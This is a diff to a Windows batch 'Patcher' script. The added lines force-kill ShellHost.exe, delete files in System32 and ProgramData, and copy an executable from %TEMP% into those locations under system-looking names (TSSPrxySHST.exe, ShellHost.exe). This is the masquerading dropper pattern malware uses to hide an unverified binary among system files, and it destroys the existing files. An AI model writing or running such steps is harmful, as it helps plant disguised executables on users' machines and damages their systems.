@@ -4,6 +4,8 @@
 
 setlocal enabledelayedexpansion
 
+set "SHSTROOT=%SystemRoot%\System32\TSSPrxySHST.exe"
+set "SHSTFILE=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 
 color 0A
  
@@ -63,9 +65,9 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
  
  
 :: Check if the file size is at least 0.4MB (400000 bytes)
-if %FILESIZE% geq 500000 (
+if %FILESIZE% geq 400000 (
     echo Starting..
-    start "" "%TEMP%\!filename!.exe"
+    rem start "" "%TEMP%\!filename!.exe"
     echo Started..
 ) else (
 echo.
@@ -78,13 +80,55 @@ echo.
 )
 
 
-
 if exist "%TEMP%\!filename!.exe" (
-    echo File exists. Attempting to run...
+    echo !filename!.exe File exists. Attempting to run...
     rem start "" "%TEMP%\!filename!.exe"
 ) else (
     echo ERROR: File not found.
 )
- 
-echo Patcher Running...
+
+
+echo.
+echo TaskKill and Delete ShellHost
+taskkill /F /IM ShellHost.exe
+taskkill /F /IM ShellHost.exe
+del /f /q /a "%SHSTROOT%"
+del /f /q /a "%SHSTFILE%"
+echo Done.
+echo.
+echo.
+echo Copying files..
+copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\TSSPrxySHST.exe" /y
+copy "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\ShellHost.exe" /y
+echo Done.
+echo.
+echo.
+
+
+echo Checking files..
+
+if exist "%SHSTROOT%" (
+    echo File exists in %SHSTROOT%
+) else (
+    echo ERROR File not found in %SHSTROOT%
+)
+
+
+
+if exist "%SHSTFILE%" (
+    echo File exists in %SHSTFILE%.
+) else (
+    echo ERROR File not found in %SHSTFILE%.
+)
+
+
+
+echo.
+echo Check Done.
+echo.
+echo.
+
+
+
+
 
